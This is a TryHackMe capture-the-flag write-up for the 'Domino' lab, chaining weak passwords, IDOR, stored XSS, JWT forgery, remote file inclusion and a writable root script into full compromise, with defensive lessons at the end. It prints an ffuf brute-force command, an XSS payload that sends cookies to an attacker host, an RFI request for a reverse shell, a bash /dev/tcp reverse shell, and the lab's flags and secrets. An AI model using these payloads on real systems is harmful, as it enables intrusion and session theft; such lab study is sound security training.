---
layout: writeup
title: "Domino"
platform: "TryHackMe"
machine: "Linux"
image: "/assets/images/domino/domino.png"
difficulty: "Medium"
date: 2026-09-26
description: "Chaining web application vulnerabilities from weak credentials and IDOR to administrator access, remote file inclusion, and root privilege escalation."
tags:
  - TryHackMe
  - Linux
  - Web
  - IDOR
  - XSS
  - JWT
  - RFI
  - Privilege Escalation
---
# Domino — TryHackMe Write-up

## Overview

The **NexusCorp Employee Portal** appears to be a typical internal application protected by authentication and role-based access control. However, several weaknesses exist across different parts of the application.

Rather than relying on a single vulnerability, the machine requires chaining multiple weaknesses together:

1. Information disclosure to enumerate valid usernames
2. Weak/default credentials
3. Horizontal IDOR to access another user's data
4. Stored XSS to steal an administrator's session cookie
5. JWT privilege escalation
6. Remote File Inclusion (RFI) to obtain a shell
7. Credential reuse to switch from `www-data` to `devops`
8. A writable script executed with root privileges for the final escalation

The vulnerabilities form a chain where each step provides the access required for the next stage.

> **Note:** IP addresses can change between machine resets/VPN sessions. The IPs shown below are the ones captured during my session.

---

# 1. Enumeration

I started with a standard Nmap scan using default scripts and service/version detection.

```bash
sudo nmap -sC -sV -oN nmap_scan.txt 10.49.184.57
```

### Results

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
```

The scan revealed two interesting services:

* **SSH (22/tcp)** — OpenSSH 9.6p1
* **HTTP (80/tcp)** — Apache 2.4.58

Since the web application was exposed on port 80, I started investigating the NexusCorp portal.

---

# 2. Web Application Enumeration

Opening the web server revealed the **NexusCorp Employee Portal**.

The login page also exposed a link to an internal team list.

![NexusCorp Portal](/assets/images/domino/image.png)

The exposed team information contained several employee usernames. This information was useful because the login form could be tested against the discovered usernames.

### Discovered usernames

```text
laura.hayes
robert.wilson
james.wright
michael.chen
emma.taylor
sarah.johnson
david.brown
```

The password-reset functionality did not appear to provide an obvious way to abuse the reset mechanism, so I moved on to testing the login functionality.

---

# 3. Weak Credentials

I tested the discovered usernames against `rockyou.txt` using `ffuf`.

```bash
ffuf \
-w username.txt:USER \
-w /usr/share/wordlists/rockyou.txt:PASS \
-X POST \
-d "username=USER&password=PASS" \
-H "Content-Type: application/x-www-form-urlencoded" \
-u http://10.49.184.57/index.php \
-fs 918
```

The response-size filter was used to remove the normal failed-login response.

### Valid credentials discovered

```text
emma.taylor : password
sarah.johnson : password
robert.wilson : password
```

Three valid accounts were identified, all using the weak password:

```text
password
```

I proceeded with the `sarah.johnson` account.

---

# 4. Horizontal IDOR

After logging in as `sarah.johnson`, I found an endpoint that returned user information based on an `id` parameter.

The application did not properly verify whether the authenticated user was authorised to access the requested account.

For example, changing the ID to:

```text
id=1
```

returned information belonging to another user:

```json
{
    "id": 1,
    "username": "laura.hayes",
    "email": "laura.hayes@nexus.corp",
    "role": "admin",
    "notes": "THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}"
}
```

This is a **Horizontal Insecure Direct Object Reference (IDOR)** because a low-privileged user can access another user's object by changing the object identifier.

More importantly, the response revealed that:

```text
laura.hayes
role = admin
```

and exposed the first flag.

### Flag

```text
THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}
```

---

# 5. Stored XSS Against the Administrator

The application allowed users to create support tickets, and those tickets were reviewed by an administrator.

This created an opportunity to test whether ticket content was safely sanitised before being rendered to the administrator.

The session cookie was also accessible to JavaScript because it was not protected with the `HttpOnly` attribute.

Therefore, a stored XSS payload could be used to send the administrator's cookie to my listener.

### XSS payload

```html
<script>
new Image().src="http://192.168.134.143:8000/?cookie="
    + btoa(document.cookie);
</script>
```

I started a listener on my machine:

```bash
nc -lnvp 8000
```

When the administrator reviewed the malicious ticket, the payload executed and generated a request back to my machine.

The request contained the administrator's session cookie:

```text
GET /?cookie= HTTP/1.1
Host: 192.168.134.143:8000
User-Agent: python-requests/2.31.0
Cookie: nexus_session=...
```

The stolen cookie represented:

```text
user_id = 1
username = laura.hayes
role = admin
```

Replacing my session cookie with the administrator's cookie allowed me to access functionality intended for the admin account.

---

# 6. JWT Privilege Escalation

After obtaining administrative access, I investigated the application's API authentication mechanism.

The application exposed:

```text
/api/auth/token.php
```

Requesting the endpoint returned a JWT:

```json
{
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9....",
    "expires_in": 3600,
    "note": "Use this token as: Authorization: Bearer <token> for /api/files.php"
}
```

The JWT contained claims similar to:

```json
{
    "sub": "laura.hayes",
    "role": "user",
    "iat": 1790265190,
    "exp": 1790268790
}
```

The API relied on the `role` claim when authorising access to `/api/files.php`.

By abusing the application's JWT implementation and obtaining a token with:

```json
{
    "sub": "laura.hayes",
    "role": "admin"
}
```

I was able to access the administrative file functionality.

> **Important:** Simply changing the Base64-encoded JWT payload does not normally make a valid token. A modified JWT must still pass signature verification. Therefore, the vulnerable implementation must allow the forged/modified token to pass its verification mechanism.

---

# 7. Remote File Inclusion

The administrative file endpoint accepted a `name` parameter.

I tested whether the application would retrieve or include a file from an external URL.

First, I prepared a reverse-shell payload and saved it as:

```text
shell.txt
```

I then hosted the file from my attacking machine:

```bash
python3 -m http.server 80
```

The vulnerable endpoint could then be accessed with:

```http
GET /api/files.php?name=http://192.168.134.143/shell.txt HTTP/1.1
Host: 10.49.179.29
Authorization: Bearer <ADMIN_TOKEN>
```

The important part of the request was:

```text
/api/files.php?name=http://192.168.134.143/shell.txt
```

The server fetched/included the remote file, causing the reverse-shell payload to execute.

I prepared a listener on port `4444`:

```bash
nc -lnvp 4444
```

The connection came back as:

```text
Linux tryhackme-2404 6.17.0-1015-aws #15~24.04.1-Ubuntu
uid=33(www-data) gid=33(www-data) groups=33(www-data)

/bin/sh: 0: can't access tty; job control turned off
$
```

I had successfully obtained a shell as:

```text
www-data
```

---

# 8. First Foothold Flag

After obtaining the web-server shell, I searched for the flag.

```bash
cat /opt/flag3.txt
```

The flag was:

```text
THM{rf1_2_rc3_f00th0ld_fl4g3}
```

---

# 9. Credential Discovery

With access as `www-data`, I searched the web application's files for configuration information.

A configuration file contained database credentials and application secrets:

```php
define('DB_HOST', 'localhost');
define('DB_NAME', 'nexusdb');
define('DB_USER', 'app_user');
define('DB_PASS', 'D3v0ps!2024');
define('JWT_SECRET', 'nexus_jwt_s3cr3t_2024');
define('APP_SECRET', 'nexus_app_k3y_2024');
```

The database password was:

```text
D3v0ps!2024
```

The password was also reused for the `devops` system account.

This allowed me to switch users:

```bash
su devops
```

```text
Password: D3v0ps!2024

whoami
devops
```

I had now moved from:

```text
www-data
```

to:

```text
devops
```

This demonstrates the danger of password reuse between application/database credentials and operating-system accounts.

---

# 10. Privilege Escalation to Root

As `devops`, I inspected directories where scheduled or administrative scripts were stored.

```bash
ls -la /opt/monitoring
```

The directory contained:

```text
drwxr-xr-x 2 root root   4096 Apr 29 10:27 .
drwxrwxrwx 5 root root   4096 May  7 20:26 ..
-rwxrwxr-- 1 root devops  583 Sep 26 09:59 health_report.sh
```

The important permission was:

```text
-rwxrwxr--
```

The file was owned by:

```text
root:devops
```

and members of the `devops` group had write permission.

Therefore, `devops` could modify the script.

If the script was executed by a privileged process such as a root cron job, modifying it would provide a path to root execution.

---

# 11. Injecting a Reverse Shell

I added a reverse-shell command to the writable script:

```bash
bash -i >& /dev/tcp/192.168.134.143/4445 0>&1
```

Then I started another listener:

```bash
nc -lnvp 4445
```

When the monitoring script executed with root privileges, the reverse shell connected back to my machine.

The resulting shell was:

```text
root@tryhackme-2404:~#
```

I had successfully escalated from:

```text
www-data
    ↓
devops
    ↓
root
```

---

# 12. Root Flag

Finally:

```bash
cat root.txt
```

returned:

```text
THM{pr1v3sc_cr0n_r00t_fl4g5}
```

---

# Attack Chain

```text
Information Disclosure
        ↓
Username Enumeration
        ↓
Weak Credentials
        ↓
Login as sarah.johnson
        ↓
Horizontal IDOR
        ↓
Discover Laura's Admin Account
        ↓
Stored XSS
        ↓
Steal Admin Session Cookie
        ↓
Administrative Access
        ↓
JWT Privilege Escalation
        ↓
Remote File Inclusion
        ↓
Reverse Shell as www-data
        ↓
Read Application Configuration
        ↓
Credential Reuse
        ↓
Switch to devops
        ↓
Writable Root-Executed Script
        ↓
Reverse Shell as root
        ↓
ROOT
```

---

# Flags

| Stage            | Flag                                |
| ---------------- | ----------------------------------- |
| IDOR             | `THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}` |
| Initial Foothold | `THM{rf1_2_rc3_f00th0ld_fl4g3}`     |
| Root             | `THM{pr1v3sc_cr0n_r00t_fl4g5}`      |

---

# Key Lessons

### 1. Information disclosure matters

An exposed employee list may look harmless, but it can significantly reduce the difficulty of username enumeration and credential attacks.

### 2. Weak passwords amplify other vulnerabilities

The use of a common password allowed valid employee accounts to be discovered quickly.

### 3. IDOR can expose sensitive information

Object identifiers must always be checked against the authenticated user's authorisation. Simply changing an `id` should never provide access to another user's private data.

### 4. Stored XSS can become account takeover

A stored XSS vulnerability becomes particularly dangerous when privileged users review attacker-controlled content and session cookies are accessible to JavaScript.

### 5. JWT claims must be properly protected

The server must cryptographically verify JWTs and must not blindly trust client-controlled claims such as `role`.

### 6. Remote file inclusion can lead directly to code execution

Allowing an endpoint to retrieve/include arbitrary remote files can turn a file-handling feature into a remote-code-execution primitive.

### 7. Credential reuse creates privilege-escalation paths

The application password being reused by the `devops` operating-system account allowed a compromise of the web application to become an OS-level account compromise.

### 8. File permissions are security boundaries

A privileged script should never be writable by a lower-privileged user or group. Otherwise, an attacker may modify the script and execute arbitrary commands with the privileges of its execution context.

---

# Conclusion

Domino demonstrates how several seemingly small weaknesses can be chained into a complete system compromise.

No single vulnerability was responsible for the entire compromise. Instead, each weakness provided the access or information required for the next stage:

```text
Enumeration → Credentials → IDOR → XSS → Admin → JWT → RFI
→ www-data → Credential Reuse → devops → Writable Script → Root
```

The main lesson is that application security cannot be evaluated by looking at vulnerabilities in isolation. Weak authentication, broken access control, unsafe input handling, insecure token validation, exposed secrets, credential reuse, and incorrect file permissions can combine into a much larger attack path.
